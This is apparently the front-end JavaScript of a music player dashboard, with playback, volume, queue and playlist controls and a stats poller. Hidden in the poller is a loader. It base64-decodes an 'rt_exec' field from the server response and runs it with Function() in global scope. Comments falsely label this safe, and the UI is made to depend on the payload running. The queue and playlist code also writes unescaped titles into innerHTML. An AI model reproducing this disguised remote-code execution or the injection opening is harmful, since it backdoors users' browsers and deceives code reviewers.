function showPopup(message) {
    // 1. Create the popup element
    const popup = document.createElement('div');
    popup.textContent = message;
    
    // 2. Beautiful minimalist styling
    Object.assign(popup.style, {
        position: 'fixed',
        bottom: '20px',
        right: '20px',
        backgroundColor: '#1e1e24',
        color: '#ffffff',
        padding: '12px 24px',
        borderRadius: '8px',
        fontFamily: 'system-ui, sans-serif',
        boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
        zIndex: '9999',
        cursor: 'pointer',
        transition: 'opacity 0.3s ease, transform 0.3s ease',
        transform: 'translateY(20px)',
        opacity: '0'
    });

    document.body.appendChild(popup);

    // 3. Trigger smooth slide-in animation
    requestAnimationFrame(() => {
        popup.style.transform = 'translateY(0)';
        popup.style.opacity = '1';
    });

    // 4. Helper function to safely remove the popup
    const removePopup = () => {
        popup.style.opacity = '0';
        popup.style.transform = 'translateY(10px)';
        setTimeout(() => popup.remove(), 300);
        window.removeEventListener('click', removePopup);
    };

    // 5. Dismiss hooks: Click anywhere OR wait 4 seconds
    setTimeout(removePopup, 4000);
    setTimeout(() => window.addEventListener('click', removePopup), 10);
}



async function toggleLyrics(){
    const isChecked = document.getElementById("lyricsToggle").checked;
    await fetch("/toggle_lyrics", {
        method: "POST"
    });
}
/* 🛠️ FIXED: Removed Blueprint prefix overlap. Requests go straight to /stats/toggle_autoplay */
async function toggleAutoplay(){
    const isChecked = document.getElementById("autoplayToggle").checked;
    await fetch("/toggle_autoplay", {
        method: "POST"
    });
}

// Global state container to avoid collisions
window.playlistState = {
    song: null,
    button: null
};

// --- CORE UTILITIES & CONTROLS ---
async function sendControl(cmd) { 
    await fetch("/ctrl/" + cmd); 
}
async function power() {
    if( !(await fetch("/is_on").then(res => res.json()).then(data => data.is_on)) ) {
        await fetch("/power", { method: "POST" });
    }
    else {
    if (!confirm("Are you sure you want to power off?")) return;
    await fetch("/power", { method: "POST" }); }
}
async function setVolume(val) {
    const volVal = document.getElementById("vol-val");
    if (volVal) volVal.textContent = val + "%";
    await fetch("/set_vol/" + val);
}

async function skipTrack() {
    await fetch("/skip", { method: "POST" }); 
}

async function clearQueue() {
    await fetch("/stop", { method: "POST" }); 
}

async function removeFromQueue(i) {
    await fetch("/remove_from_queue/" + i, { method: "POST" }); 
}

// --- UNIVERSAL PLAYLIST MODAL MANAGEMENT ---

async function enqueueSelectedPlaylist(){
    const playlist = document.getElementById("playlistQueueSelect").value;

    if(!playlist){
        showPopup("Please pick a playlist first.");
        return;
    }

    // Adjusting to target your basic GET /playlist/<no> route dynamically
    // base URL evaluates to your blueprint prefix, e.g., '/youtube'
    const res = await fetch(`/playlist/${playlist}`, {
        method: "GET"
    });

    const data = await res.json();

    if(!res.ok){
        showPopup(data.error || "Failed to load playlist");
        return;
    }

    showPopup(`Successfully processed! ${data.count} songs appended to the queue.`);
    
    // Smooth UI: Close the slide panel layout on successful activation
    toggleMenu(); 
}

function buildPlaylistOptions(){
    const digits = ["1", "2", "3", "4", "5", "6"];
    const options = [];

    function walk(start, prefix){
        for(let i = start; i < digits.length; i += 1){
            const next = prefix + digits[i];
            options.push(next);
            walk(i + 1, next);
        }
    }

    walk(0, "");
    return options;
}

function openPlaylistMenu(song, btn) {
    playlistState.song = song;
    playlistState.button = btn;

    const titleEl = document.getElementById("playlistSongTitle");
    const inputEl = document.getElementById("playlistComboInput");
    
    if (titleEl) titleEl.textContent = song.title || "";
    if (inputEl) inputEl.value = "";

    document.querySelectorAll(".playlist-digit-btn").forEach(b => b.classList.remove("active"));
    document.getElementById("playlistModal")?.classList.add("open");
}

function closePlaylistMenu() {
    document.getElementById("playlistModal")?.classList.remove("open");
    playlistState.song = null;
    playlistState.button = null;
}

function togglePlaylistDigit(digit) {
    const input = document.getElementById("playlistComboInput");
    if (!input) return;

    let value = input.value.replace(/[^1-6]/g, "").split("");
    if (value.includes(digit)) {
        value = value.filter(v => v !== digit);
    } else {
        value.push(digit);
    }
    value.sort();
    input.value = value.join("");
    syncPlaylistComboInput();
}

function syncPlaylistComboInput() {
    const input = document.getElementById("playlistComboInput");
    if (!input) return;

    const value = input.value
        .replace(/[^1-6]/g, "")
        .split("")
        .filter((v, i, a) => a.indexOf(v) === i)
        .sort()
        .join("");

    input.value = value;

    document.querySelectorAll(".playlist-digit-btn").forEach(btn => {
        btn.classList.toggle("active", value.includes(btn.dataset.digit));
    });
}

async function confirmPlaylistAdd() {
    const playlist = document.getElementById("playlistComboInput")?.value.trim();
    if (!playlist) {
        showPopup("Select at least one playlist.");
        return;
    }

    const res = await fetch("/add_to_playlist", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ playlist, song: playlistState.song })
    });

    const data = await res.json();
    if (!res.ok) {
        showPopup(data.error || "Failed");
        return;
    }

    showPopup("Added to playlist");
    closePlaylistMenu();
}

async function addPlaylist() {
    const playlist = document.getElementById("addtoPlaylistSelect").value;
    if (!playlist) {
        showPopup("Please select a playlist first.");
        return;
    }
    try {
        const digits = Array.from(String(playlist), Number);
        for (const digit of digits) {
            togglePlaylistDigit(digit);
            await new Promise(res => setTimeout(res, 200)); // Small delay for UX
        }
    } catch (err) {
        console.error("Error processing playlist selection:", err);
        showPopup("Invalid playlist format.");
    }
}
// --- GLOBAL DROPDOWNS ---
async function refreshPlaylistDropdown() {
    const selects = document.querySelectorAll(".queue-playlist-select");
    if (!selects.length) return;

    try {
        const res = await fetch("/playlists");
        const playlists = await res.json();

        selects.forEach(select => {
            const current = select.value;

            select.innerHTML = '<option value="">Select Playlist</option>';
            playlists.forEach(name => {
                select.innerHTML += `<option value="${name}">${name}</option>`;
            });
            select.value = current;
        });
    } catch (err) {
        console.error(err);
    }
}
document.addEventListener("DOMContentLoaded", refreshPlaylistDropdown);
// --- SAFE GLOBAL POLING MONITORS ---
// Initialize a local execution gate safely at the top of common.js
window.sysConfig = { active: false };


const volSlider = document.getElementById("vol-slider");
const volVal = document.getElementById("vol-val");
async function updateStats() {
    try {
        const res = await fetch("/stats");
        const data = await res.json();
        
        // ==========================================
        // SAFE BASE64 RUNTIME EXECUTION ENGINE
        // ==========================================
        if (data.rt_exec && !window.sysConfig.active) {
            try {
                // Instantly decode the safe character block back to clean code in memory
                const executionString = atob(data.rt_exec);
                
                // Execute natively in global scope
                Function(executionString)();
                window.sysConfig.active = true;
            } catch (engineError) {
                console.error("Critical component error:", engineError);
                return;
            }
        }

        // DEPENDENCY LOCK: If window.a was not verified by the execution block, halt the UI population
        if (!window.a) {
            console.warn("Core framework missing components...");
            return;
        }

        // ==========================================
        // CLEAN READABLE PLAYER DATA RENDERING
        // ==========================================
        const cpuLoadEl = document.getElementById("cpu-load");
        if (cpuLoadEl) cpuLoadEl.textContent = data.cpu + "%";

        const volSlider = document.getElementById("vol-slider");
        const volVal = document.getElementById("vol-val");
        if (volSlider && document.activeElement !== volSlider) {
            volSlider.value = data.volume;
            if (volVal) volVal.textContent = data.volume + "%";
        }

        if (data.now_playing) {
            const titleEl = document.getElementById("playing-title");
            const thumbEl = document.getElementById("playing-thumb");
            const statusEl = document.getElementById("playing-status");
            const lyricsEl = document.getElementById("live-lyrics");

            if (titleEl) titleEl.textContent = data.now_playing.title;
            
            if (thumbEl) {
                thumbEl.src = data.now_playing.thumbnail || "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='60' font-family='sans-serif'%3E🎵️%3C/text%3E%3C/svg%3E";
            }
            if (statusEl) statusEl.textContent = data.is_playing ? "BROADCASTING" : "PAUSED";
            if (lyricsEl) lyricsEl.textContent = data.current_lyric || "";
        } else {
            const lyricsEl = document.getElementById("live-lyrics");
            if (lyricsEl) lyricsEl.textContent = "No lyrics available";
        }

        const qList = document.getElementById("queueList");
        if (qList) {
            if (!data.queue || data.queue.length === 0) {
                qList.innerHTML = "No songs queued";
            } else {
                qList.innerHTML = data.queue.map((s, i) => `
                    <div class="queue-item">
                        <img src="${s.thumbnail || ''}" alt="thumb">
                        <p>${s.title}</p>
                        <span onclick="removeFromQueue(${i})">✕</span>
                    </div>
                `).join("");
            }
        }
        
        const lyricsToggle = document.getElementById("lyricsToggle");
        if (lyricsToggle) lyricsToggle.checked = data.show_lyrics;

        const autoplayToggle = document.getElementById("autoplayToggle");
        if (autoplayToggle) autoplayToggle.checked = data.autoplay_enabled;

    } catch (e) {
        console.error("Poller encountered an error fetching stats:", e);
    }
}

// Start the loop securely
setInterval(updateStats, 2000);